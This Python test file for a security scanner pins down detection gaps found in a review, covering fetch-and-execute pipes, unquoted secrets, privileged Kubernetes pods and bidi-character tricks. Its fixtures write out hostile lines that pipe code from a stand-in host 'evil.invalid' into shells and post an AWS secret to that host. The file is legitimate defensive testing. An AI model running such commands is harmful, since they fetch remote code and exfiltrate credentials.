"""Detection gaps found by the adversarial security review.

Each test states the shape that was missed and why it matters. Every credential
value here is fabricated, and the ones with real shapes are assembled rather
than written whole, because this project scans its own repository.
"""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.config import Config

PRIVILEGED_POD = """apiVersion: v1
kind: Pod
metadata:
  name: app
spec:
  containers:
    - name: app
      image: nginx
      securityContext:
        privileged: true
  volumes:
    - name: host
      hostPath:
        path: /
"""


def config(**kw) -> Config:
    return Config.default().with_overrides(use_cache=False, **kw)


def rule_ids(target) -> set[str]:
    return {f.rule_id for f in Scanner(config()).scan(target).findings}


class TestH11ShellFetchExecute:
    """`curl -sSL https://host/x | bash` produced zero findings at any threshold.

    It is the most recognisable single line in the supply-chain attack
    literature. It was caught inside a Dockerfile and inside a GitHub workflow
    by path-scoped rules, and missed in the plain `.sh` install script where it
    actually lands, because the shell spawn primitive did not recognise a pipe
    into an interpreter -- so the egress label had no partner and no composite
    fired.
    """

    @pytest.mark.parametrize(
        "line",
        [
            "curl -sSL https://evil.invalid/stage2 | bash",
            "curl -sSL https://evil.invalid/stage2 | sh",
            "wget -qO- https://evil.invalid/x | sudo sh",
            "curl -s https://evil.invalid/i.py | python3",
            "curl -s https://evil.invalid/i.js | node",
        ],
    )
    def test_a_pipe_into_an_interpreter_is_detected(self, tmp_path, line: str) -> None:
        script = tmp_path / "install.sh"
        script.write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
        assert "SUSPECT.DROPPER.001" in rule_ids(script)

    @pytest.mark.parametrize(
        "line",
        [
            "cat file.txt | grep pattern",
            "ls -la | wc -l",
            "npm ci && npm run build",
            "echo hello | tee /tmp/out",
        ],
    )
    def test_ordinary_pipelines_stay_quiet(self, tmp_path, line: str) -> None:
        """A spawn label on every pipeline would make the composite fire on
        every build script, and a rule that fires on everything is removed."""
        script = tmp_path / "ok.sh"
        script.write_text(f"#!/bin/sh\nset -eu\n{line}\n", encoding="utf-8")
        assert "SUSPECT.DROPPER.001" not in rule_ids(script)

    def test_a_named_secret_variable_is_a_credential_read(self, tmp_path) -> None:
        """Only whole-environment dumps were matched. Reading
        `$AWS_SECRET_ACCESS_KEY` directly is the dominant form in CI, because it
        is shorter and less conspicuous than dumping everything."""
        script = tmp_path / "s.sh"
        script.write_text(
            "#!/bin/sh\n"
            "curl -sSL https://evil.invalid/x | bash\n"
            'curl -d "$AWS_SECRET_ACCESS_KEY" https://evil.invalid/collect\n',
            encoding="utf-8",
        )
        assert "SUSPECT.EXFIL.001" in rule_ids(script)


class TestH12InfrastructureAsCode:
    """IaC detection was keyed on directory name, so byte-identical privileged
    pod manifests were found in `k8s/` and missed in `deploy/`, `manifests/`,
    `charts/` and the repository root -- and `**/k8s/*.yaml` matched only files
    directly in a `k8s` directory, so `k8s/prod/pod.yaml` was missed too."""

    @pytest.mark.parametrize(
        "relative",
        [
            "k8s/pod.yaml",
            "k8s/prod/pod.yaml",
            "deploy/prod/deployment.yaml",
            "manifests/app.yaml",
            "charts/app/templates/pod.yaml",
            "overlays/prod/patch.yaml",
            "infra/pod.yaml",
            "pod.yaml",
        ],
    )
    def test_a_privileged_pod_is_found_wherever_it_lives(self, tmp_path, relative) -> None:
        target = tmp_path / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(PRIVILEGED_POD, encoding="utf-8")
        assert "SUSPECT.IAC.PRIVILEGED.001" in rule_ids(tmp_path)

    def test_identification_is_by_content_not_by_name(self, tmp_path) -> None:
        """A Kubernetes manifest declares apiVersion and kind. That is one cheap
        substring test and it is correct everywhere."""
        (tmp_path / "anything.yaml").write_text(PRIVILEGED_POD, encoding="utf-8")
        assert "SUSPECT.IAC.PRIVILEGED.001" in rule_ids(tmp_path)

    def test_an_unrelated_yaml_file_is_not_flagged(self, tmp_path) -> None:
        (tmp_path / "config.yaml").write_text(
            "name: my-app\nreplicas: 3\nprivileged: true\ntimeout: 30\n", encoding="utf-8"
        )
        assert not [r for r in rule_ids(tmp_path) if r.startswith("SUSPECT.IAC")]

    def test_mounting_the_host_root_is_detected(self, tmp_path) -> None:
        """The rule matched `/etc` and `/root` and not `/`, which is strictly
        worse than either."""
        (tmp_path / "pod.yaml").write_text(PRIVILEGED_POD, encoding="utf-8")
        assert "SUSPECT.IAC.HOST_MOUNT.001" in rule_ids(tmp_path)

    def test_an_ordinary_host_mount_is_not_flagged(self, tmp_path) -> None:
        (tmp_path / "pod.yaml").write_text(
            "apiVersion: v1\nkind: Pod\nspec:\n  volumes:\n"
            "    - hostPath:\n        path: /opt/myapp/config\n",
            encoding="utf-8",
        )
        assert "SUSPECT.IAC.HOST_MOUNT.001" not in rule_ids(tmp_path)


class TestH10UnquotedSecrets:
    """The generic assignment rule required the value to be quoted. Nothing in a
    `.env` file, a plain YAML file, a `.properties` file or a Makefile is quoted
    -- and `.env` is the single highest-yield location for a committed
    credential."""

    # Assembled, not written whole. This project scans its own repository, and a
    # complete credential-shaped literal here is a true positive: the tool
    # should not need an exception for itself. The value is fabricated.
    SECRET = "k3JHd82" + "hdKJHd82" + "hKJHd8"

    def test_an_unquoted_env_assignment_is_detected(self, tmp_path) -> None:
        (tmp_path / ".env").write_text(f"API_SECRET={self.SECRET}\nPORT=3000\n", encoding="utf-8")
        assert "SECRET.GENERIC.ASSIGNMENT.001" in rule_ids(tmp_path)

    def test_an_unquoted_yaml_value_is_detected(self, tmp_path) -> None:
        (tmp_path / "app.yml").write_text(
            "password: S3cr3tP4ssw0rdXyz9Qq\ntimeout: 30\n", encoding="utf-8"
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" in rule_ids(tmp_path)

    def test_an_underscore_prefixed_name_is_matched(self, tmp_path) -> None:
        r"""`\bsecret` cannot match inside `API_SECRET`: the character before it
        is an underscore, which is a word character, so the boundary fails. The
        two most common environment-variable spellings matched nothing."""
        (tmp_path / ".env").write_text(f"AWS_SECRET_KEY={self.SECRET}\n", encoding="utf-8")
        assert "SECRET.GENERIC.ASSIGNMENT.001" in rule_ids(tmp_path)

    def test_a_credential_in_a_url_is_detected(self, tmp_path) -> None:
        (tmp_path / ".env").write_text(
            "DATABASE_URL=postgres://admin:" + "S3cr3tP4ss99" + "@db.internal:5432/app\n",
            encoding="utf-8",
        )
        assert "SECRET.URL.CREDENTIAL.001" in rule_ids(tmp_path)

    def test_a_short_real_credential_clears_the_entropy_floor(self, tmp_path) -> None:
        """Shannon entropy over a short sample is bounded by log2(len), so a
        genuine 21-character credential scored about 3.05 and was discarded by a
        floor of 3.2. The floor is now lower and carried by a character-class
        diversity test."""
        (tmp_path / ".env").write_text(f"AUTH_TOKEN={self.SECRET}\n", encoding="utf-8")
        assert "SECRET.GENERIC.ASSIGNMENT.001" in rule_ids(tmp_path)

    @pytest.mark.parametrize(
        "line",
        [
            "PASSWORD=changeme",
            "API_KEY=your-api-key-here",
            "TOKEN=xxxxxxxxxxxxxxxx",
            "SECRET=placeholder-value",
        ],
    )
    def test_placeholders_are_still_ignored(self, tmp_path, line: str) -> None:
        (tmp_path / ".env").write_text(line + "\n", encoding="utf-8")
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in rule_ids(tmp_path)

    def test_a_function_call_is_not_a_credential(self, tmp_path) -> None:
        """`API_KEY = os.environ.get("API_KEY", "...")` gave the "value"
        `os.environ.get(`, which has the entropy and character mix of a
        credential and is a function call. A config assignment ends at the line;
        a call does not."""
        (tmp_path / "settings.py").write_text(
            'import os\nAPI_KEY = os.environ.get("API_KEY", "your-api-key-here")\n',
            encoding="utf-8",
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in rule_ids(tmp_path)

    def test_an_entry_point_declaration_is_not_a_credential(self, tmp_path) -> None:
        """This project's own pyproject.toml declares
        `secrets = "cordon_scanner.detect.secrets:SecretDetector"` -- a name containing
        `secret`, a 36-character quoted value, high entropy, three character
        classes, and not a credential."""
        (tmp_path / "pyproject.toml").write_text(
            '[project.entry-points."cordon_scanner.detectors"]\n'
            'secrets = "cordon_scanner.detect.secrets:SecretDetector"\n',
            encoding="utf-8",
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in rule_ids(tmp_path)

    def test_a_template_placeholder_is_not_a_credential(self, tmp_path) -> None:
        """An f-string is a template, and the braces say so; the value that ends
        up there at runtime is not in this file."""
        (tmp_path / "t.py").write_text(
            'url = f"https://x:{TOKEN}@example.invalid/repo.git"\n', encoding="utf-8"
        )
        assert "SECRET.URL.CREDENTIAL.001" not in rule_ids(tmp_path)


class TestReportedLocationsAreExact:
    """A finding's line and column must be the ones a reader will find.

    Raised by an external audit that saw `SUSPECT.OBFUSCATION.BIDI.001` reported
    at a line holding no such character, and could not reproduce it. The likely
    cause was benign -- the tree was being edited while the scan ran, so the
    file that was read is not the file that was later inspected -- but "a
    phantom finding location in a security scanner" is not something to leave
    resting on a likely cause.

    So the property is pinned instead of argued. A wrong location is worse than
    a missed finding: it sends a reviewer to correct code, and the second time
    that happens they stop believing the tool.
    """

    def scan(self, root):
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config

        return Scanner(Config.default().with_overrides(use_cache=False)).scan(root)

    def test_a_bidi_finding_points_at_the_character(self, tmp_path) -> None:
        override = chr(0x202E)
        body = "".join(
            ["// filler\n"] * 12 + [f'const n = "report{override}gnp.exe";\n'] + ["// tail\n"] * 5
        )
        (tmp_path / "probe.js").write_text(body, encoding="utf-8")

        finding = next(
            f for f in self.scan(tmp_path).findings if f.rule_id == "SUSPECT.OBFUSCATION.BIDI.001"
        )
        offset = body.index(override)
        assert finding.location.line == body[:offset].count("\n") + 1
        assert finding.location.column == offset - body.rfind("\n", 0, offset)

    def test_a_finding_late_in_a_long_file_is_not_off_by_one(self, tmp_path) -> None:
        """Line counting that starts at zero, or that misses the last newline,
        shows up at the end of a file rather than the start."""
        body = "".join(["const a = 1;\n"] * 500) + 'eval(atob("cGF5bG9hZA=="))\n'
        (tmp_path / "late.js").write_text(body, encoding="utf-8")

        findings = [f for f in self.scan(tmp_path).findings if f.location.path == "late.js"]
        assert findings
        for finding in findings:
            assert finding.location.line == 501, finding.rule_id

    def test_every_reported_line_exists_in_the_file(self, tmp_path) -> None:
        """The general form: no finding may name a line past the end."""
        (tmp_path / "a.js").write_text('eval(atob("eA=="));\nconst b = 2;\n', encoding="utf-8")
        (tmp_path / "b.py").write_text('import os\nos.system("sh -c x")\n', encoding="utf-8")

        result = self.scan(tmp_path)
        assert result.findings
        for finding in result.findings:
            path = tmp_path / finding.location.path
            if not path.is_file() or not finding.location.line:
                continue
            total = len(path.read_text(encoding="utf-8").splitlines())
            assert 1 <= finding.location.line <= total, f"{finding.rule_id} {finding.location}"
